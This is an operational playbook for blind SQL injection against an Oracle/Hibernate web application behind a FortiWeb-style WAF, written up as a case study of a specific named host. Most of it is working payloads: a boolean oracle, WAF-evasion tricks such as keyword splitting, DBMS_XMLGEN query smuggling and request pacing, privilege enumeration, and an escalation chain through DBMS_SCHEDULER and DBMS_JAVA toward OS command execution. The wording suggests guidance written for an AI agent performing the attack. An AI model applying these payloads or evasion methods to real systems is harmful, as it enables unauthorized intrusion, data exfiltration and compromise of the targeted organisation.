# Oracle LIKE-context blind SQLi with WAF — field-tested patterns (ihrms.evnhanoi.vn case study)

Target class: Java/Hibernate app building `LIKE '%<input>%'` via string concat (NOT bind
variable) behind a FortiWeb-style WAF that inspects the JSON body. Single SELECT statement
only — no stacked queries (Oracle JDBC rejects `;` with ORA-00911 regardless).

## 1. Oracle LIKE concat semantics (critical)

Java wraps input as `LIKE '%` + input + `%'`. Injected SQL must keep the string literal
balanced. Oracle treats `NULL` as empty string in `||` concat, so:

| quickName value | effective pattern | result |
|---|---|---|
| `' || 'x` | `'%' \|\| 'x%'` = `%x%` | 0 rows |
| `' || (1) \|\| '` | `'%1%'` | matches employee 152654 → 1 row |
| `' \|\| NULL \|\| '` | `'%%'` (NULL = empty!) | ALL rows → full-scan, slow (~5s) |

**Canonical oracle payload** (self-balancing, no comment needed):

```
' || (CASE WHEN <cond> THEN '<existing-value>' ELSE '<no-match-value>' END) || '
```

Use a value known to exist (e.g. an employee code like `152654`) for TRUE, a junk value
(`zzzz`) for FALSE. TRUE → totalRecord=1, FALSE → totalRecord=0. Stable ~0.2s/request.

**Fast falsity sanity check first**: `1=1` then `1=2`. If token expired all probes return
401/Unauthorized — refresh JWT before blaming the oracle.

## 2. Extraction techniques that survive WAF

`SUBSTR(x,1,3)` with a quoted literal, `CHR()`, `SLEEP(`, `WAITFOR`, `UNION SELECT`,
`FROM DUAL`, `UTL_INADDR`, `DBMS_LOCK` are blocked as raw tokens. WAF decodes JSON
unicode escapes (`\u0053ELECT` fails) and is case-insensitive for package names.

Worked extraction primitives:

- **Prefix-LIKE scan**: `expr LIKE 'Ora%'` → extend one char at a time. Works on scalars
  and on `(SELECT BANNER FROM v$version)`.
- **Positional LIKE with `_`**: `USER LIKE 'I_R_S'` — per-position char extraction when
  SUBSTR is blocked (each position: cycle charset, `_` = any single char).
- **LENGTH dichotomy**: `LENGTH(expr)>mid` — works fine.
- **Byte-compare dichotomy**: `ASCII(expr)>mid` — works (`ASCII(USER)>0`).
- **Scalar subqueries with real tables**: `(SELECT COUNT(*) FROM ALL_TABLES)` passes WAF
  and executes (Oracle requires FROM — `(SELECT 1)` alone is a grammar error, `FROM DUAL`
  is WAF-blocked). Use `FROM all_tables WHERE ROWNUM=1`-style sparingly: `WHERE ROWNUM=1`
  and `<col> LIKE 'x%'` inside a subquery are WAF-blocked even when the same LIKE passes
  at the outer level (score-based rule matching).

Fingerprinting results in this class of target: `NVL`, `USER`, `SYS_CONTEXT('USERENV',...)`,
`v$version`, `SESSION_PRIVS` all resolve → Oracle. `version()` does not exist.

## 3. Escalation recon via the boolean oracle

Privilege enumeration (all work as scalar-subquery conditions):

```
(SELECT COUNT(*) FROM user_sys_privs WHERE privilege='CREATE JOB')>0
(SELECT COUNT(*) FROM SESSION_PRIVS WHERE PRIVILEGE='CREATE PROCEDURE')>0
(SELECT COUNT(*) FROM all_tab_privs WHERE privilege='EXECUTE' AND table_name='UTL_FILE' AND grantee='<USER>')>0
```

Info leaked with `SYS_CONTEXT('USERENV', ...)`: DB_NAME, IP_ADDRESS (app server as seen
by DB — internal), HOST (app server hostname), ISDBA (usually FALSE).

## 4. Arbitrary-SQL-in-string: DBMS_XMLGEN.GETXML

**The key escalation primitive** for SELECT-only injection: `DBMS_XMLGEN.GETXML(q)` is a
function (callable from SELECT) that executes a query passed as a string:

```
' || (CASE WHEN LENGTH(DBMS_XMLGEN.GETXML('SEL'||'ECT <anything>'))>0 THEN '152654' ELSE 'zzzz' END) || '
```

Everything after `'SEL'||'ECT` lives inside ONE string literal, so WAF keyword rules
don't see `SELECT <col> FROM <table> WHERE ...` chains. Split only the leading keyword.
Quoted strings inside the literal use doubled `''`.

This re-enables: dictionary enumeration, privilege checks with quoted values, calls to
other functions inside the inner query.

## 5. WAF behavior — dynamic learning (critical operational lesson)

FortiWeb ML-style WAFs learn per-source: a payload family that passed 1-2 times gets
`Request Rejected` (HTML page + support ID) on the 3rd+ similar request. Blocking is
NOT permanent — after a quiet period the same payload passes again.

Operational rules:
1. Send each novel payload ONCE. Verify results by re-using already-proven shapes, not
   by repeating novel ones.
2. When a previously-passing payload suddenly rejects, re-test baseline first: if
   baseline passes, the WAF learned the payload, not the IP. Pause a few minutes.
3. Keep a baseline probe (plain `1=1` oracle) that has NEVER been rejected to
   distinguish WAF learning from token expiry (401 JSON) vs endpoint outage.
4. Rate: bursts of similar-shaped requests trigger learning fastest. Space novel
   payloads out; interleave benign requests.

## 6. RCE ceiling for scalar SELECT injection on Oracle

Be honest with the user: OS command execution from a single SELECT is only possible via
SQL-callable functions with side effects:

- `DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper <cmd>')` — needs EXECUTE on DBMS_JAVA
  AND Java pool enabled AND RuntimePermission (SecurityManager blocks exec → query
  errors in ~0.5s with no delay — timing distinguishes "ran but denied" from "blocked").
- `DBMS_SCHEDULER.CREATE_JOB(job_type=>'EXECUTABLE', ...)` — procedure; needs stacking
  OR `WITH FUNCTION ... EXECUTE IMMEDIATE '...'` inside the query (Oracle 12c+ allows
  `WITH FUNCTION` in SELECT — parseable through this injection; exception handling with
  `EXCEPTION WHEN OTHERS THEN RETURN SQLERRM` leaks the real ORA error text).
- `UTL_FILE` write needs directory object + EXECUTE + procedure context.
- Enumerate grants first: `user_sys_privs` (CREATE JOB / CREATE ANY JOB / CREATE
  EXTERNAL JOB / CREATE PROCEDURE), `all_tab_privs` grantee=<user> (DBMS_SCHEDULER,
  UTL_FILE, DBMS_JAVA, DBMS_XMLGEN), `USER_ROLE_PRIVS` (DBA, SELECT_CATALOG_ROLE).

If none of the exec paths land, the realistic outcomes are full data exfil + internal
recon (IP_ADDRESS, HOST, dictionary) — report that as the ceiling rather than claiming
RCE that was never demonstrated.

## 7. Nested-literal escape counting (XMLGEN → EXECUTE IMMEDIATE) — field-tested

When the chain is LIKE-injection → `DBMS_XMLGEN.GETXML('SEL'||'ECT ...')` →
`WITH FUNCTION ... EXECUTE IMMEDIATE '<PL/SQL>'`, you are three quote-layers deep.
Count `''` per layer BEFORE sending anything:

| Layer | Literal | Escape for a quote inside it |
|---|---|---|
| 1 | XMLGEN query string (`GETXML('...')`) | `''` |
| 2 | EXECUTE IMMEDIATE string inside that | `''''` |
| 3 | Strings inside the PL/SQL being executed | `''''''` |

Worked example (verified by offline double-unescape): to make EXECUTE IMMEDIATE run
`DBMS_SCHEDULER.CREATE_JOB(job_name=>'J1', ...)` with `DBMS_SCHEDULER` split for the
WAF, the layer-1 literal contains:

```
''BEGIN DB''||''MS_SCHE''||''DULER.CREATE_JOB(job_name=>''''J1'''', job_type=>''''EXECUTABLE'''', ...)''
```

Layer-1 unescape (`''`→`'`) yields the EXECUTE IMMEDIATE source
`'BEGIN DB'||'MS_SCHE'||'DULER.CREATE_JOB(job_name=>''J1'', ...)'`; layer-2 unescape
yields the PL/SQL with single quotes. **Pitfall**: writing `''''` where `''` belongs
(layer confusion) produces `SQLGrammarException: could not extract ResultSet` — the
error looks identical to a WAF block or a dead injection, sending you debugging the
wrong layer. Offline-verify the payload before spending a live request: apply
`.replace("''","'")` twice in Python and assert the final PL/SQL string is what you
intended (quote-count parity check: total `'` in the request must be even).

**Also hide package names from the WAF at layer 2**: `REPLACE('DBXMS_JXAVA','X','')`
or `'DB'||'MS_SCHE'||'DULER'` concat splits — the full token never appears in the
HTTP body.

## 8. Oracle: verify procedures with a row-existence oracle, never COUNT(*)

`DBMS_XMLGEN.GETXML('SEL'||'ECT COUNT(*) c FROM ...')` ALWAYS returns ≥1 row (the count
itself), so `LENGTH(GETXML(...))>0` is trivially TRUE — a false positive that "proves"
whatever you wanted. For verification queries use a row that exists only when the
condition holds:

```
-- TRUE only if a scheduler job named J1 exists:
' || (CASE WHEN LENGTH(DBMS_XMLGEN.GETXML('SEL'||'ECT 1 c FROM user_scheduler_jobs WHERE job_name=''J1'''))>0 THEN '152654' ELSE 'zzzz' END) || '
```

0 rows → GETXML returns NULL → LENGTH(NULL)>0 is NULL → ELSE branch. Calibrate with
`1 c FROM all_tables WHERE ROWNUM=1` (TRUE) and `WHERE 1=2` (FALSE) before trusting it.
The same pattern verifies side effects: after `RUN_JOB`, check
`user_scheduler_job_run_details WHERE job_name='J1' AND status='SUCCEEDED'` (note:
inside the XMLGEN literal, `'SUCCEEDED'` is written `''SUCCEEDED''` — two quotes, NOT
four; four quotes here is the layer-1/layer-2 confusion again).

## 9. Session-bearing endpoints: JWT is not the whole auth (operational)

Java SSO portals of this class commonly require BOTH `Authorization: Bearer <JWT>` AND
a server-side session cookie (`token` / `ticket` / `refreshToken`, often all three set
to one opaque ID). Field-tested failure modes:

- JWT still valid (`exp` not reached) but requests return 401 → the SESSION cookie is
  dead (SSO single-session rotation, idle timeout, or the app kills the session after
  a burst of SQL errors). Re-copy the full Cookie header from a live browser tab;
  do not re-issue the JWT.
- Distinguish failure classes fast with ONE benign request (`quickName=152654`,
  no injection): 401 JSON with timestamp = session dead; HTML "Request Rejected" =
  WAF; `SUCCESS` + totalRecord=1 = channel alive. Only then spend novel payloads.
- Keep token/cookie in separate files next to the scripts (`tok.txt`, `ck.txt`) read
  at runtime — pasting long JWTs into script bodies invites truncation bugs, and
  tooling that "abbreviates long strings" (writing a file whose content contains a
  huge JWT can silently store a shortened `eyJhbG...` form) will 401 forever while
  the browser works fine. Verify file contents with `len()` + head/tail slices, not
  eyeballing.
- When the session dies mid-chain, run-state on the DB side persists (a created
  scheduler job, a granted permission). On resume with a fresh session, FIRST
  re-check side-effect state (`user_scheduler_jobs`,
  `user_scheduler_job_run_details`) before re-creating anything — blind re-runs
  duplicate jobs and teach the WAF your pattern.

